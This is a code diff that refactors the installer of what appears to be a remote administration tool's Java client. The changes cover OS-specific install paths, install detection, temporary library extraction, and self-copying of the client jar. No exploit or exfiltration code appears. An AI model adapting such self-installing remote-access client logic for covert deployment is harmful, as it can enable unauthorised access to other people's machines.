@@ -24,8 +24,6 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.net.URISyntaxException;
 
-import com.subterranean_security.crimson.client.net.ClientCommands;
-import com.subterranean_security.crimson.core.Platform;
 import com.subterranean_security.crimson.core.proto.Generator.ClientConfig;
 import com.subterranean_security.crimson.core.util.B64;
 import com.subterranean_security.crimson.core.util.CUtil;
@@ -34,14 +32,26 @@ public class Installer {
 
 	public static ClientConfig ic;
 	public static String jarPath;
+	public static String jarDir;
 
 	private static boolean debug = new File("/debug.txt").exists();
 
-	public static File temp = new File(System.getProperty("java.io.tmpdir") + "/client-temp");
-
-	private static String base = null;
-
 	public static void main(String[] args) {
+
+		try {
+			jarPath = Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
+			jarDir = new File(jarPath).getParent();
+		} catch (URISyntaxException e) {
+			System.out.println("Code source error!");
+			System.exit(1);
+		}
+
+		if (isInstalled()) {
+			Client.main(args);
+			return;
+		}
+
+		File temp = new File(System.getProperty("java.io.tmpdir") + "/client_" + CUtil.Misc.randString(8));
 		temp.mkdir();
 		CUtil.Files.extract("com/subterranean_security/crimson/client/res/bin/lib.zip",
 				temp.getAbsolutePath() + "/lib.zip");
@@ -64,58 +74,29 @@ public class Installer {
 			ic = readInternal();
 		} catch (Exception e) {
 			System.out.println("Fatal: Could not read internal.txt");
-			return;
+			System.exit(1);
 		}
 
-		switch (Platform.osFamily) {
-		case BSD:
+		String base = null;
+		String name = System.getProperty("os.name").toLowerCase();
+		if (name.endsWith("bsd")) {
 			base = ic.getPathBsd();
-			break;
-		case LIN:
-			base = ic.getPathLin();
-			break;
-		case OSX:
+		} else if (name.equals("mac os x")) {
 			base = ic.getPathOsx();
-			break;
-		case SOL:
+		} else if (name.equals("solaris") || name.equals("sunos")) {
 			base = ic.getPathSol();
-			break;
-		case WIN:
+		} else if (name.equals("linux")) {
+			base = ic.getPathLin();
+		} else if (name.startsWith("windows")) {
 			base = ic.getPathWin();
-			break;
-		default:
-			break;
-
 		}
 
-		try {
-			if (!isInstalled()) {
-				if (!packagedLibsFound()) {
-					try {
-						ClientStore.Connections.setTargets(ic.getTargetList());
-						ClientStore.Connections.setPeriod(ic.getReconnectPeriod());
-						ClientStore.Connections.connectionRoutine();
-					} catch (Exception e) {
-						// TODO Auto-generated catch block
-						e.printStackTrace();
-						System.out.println("Cannot download libraries due to invalid internal syntax");
-						System.exit(0);
-					}
-					ClientCommands.downloadLibs();
-				}
-				if (install()) {
-					System.out.println("Install Success");
-				} else {
-					System.out.println("Install Failed");
-				}
-				return;
-			}
-		} catch (URISyntaxException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+		if (install(base)) {
+			System.out.println("Install Success");
+		} else {
+			System.out.println("Install Failed");
 		}
-
-		Client.main(args);
+		CUtil.Files.delete(temp);
 
 	}
 
@@ -134,15 +115,19 @@ public class Installer {
 		return cc;
 	}
 
-	public static boolean isInstalled() throws URISyntaxException {
-		jarPath = Client.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath();
-		File t1 = (new File(jarPath)).getParentFile();
-		File t2 = new File(base);
-		System.out.println("Testing for equality: " + t1.getAbsolutePath() + " and: " + t2.getAbsolutePath());
-		return (new File(jarPath)).getParentFile().equals(new File(base));
+	public static boolean isInstalled() {
+		if (!new File(jarDir + "/var/client.db").exists()) {
+			return false;
+		}
+
+		if (!new File(jarDir + "/lib/java/c09.jar").exists()) {
+			return false;
+		}
+
+		return true;
 	}
 
-	public static boolean install() {
+	public static boolean install(String base) {
 		System.out.println("Starting installation");
 		if (!(new File(base)).mkdirs()) {
 			System.out.println("Failed to create install base");
@@ -174,7 +159,7 @@ public class Installer {
 		System.out.println("Copying client jar");
 		File client = new File(base + "/client.jar");
 		try {
-			CUtil.Files.copyFile(client, new File(jarPath));
+			CUtil.Files.copyFile(new File(jarPath), client);
 		} catch (IOException e) {
 			// TODO Auto-generated catch block
 			e.printStackTrace();
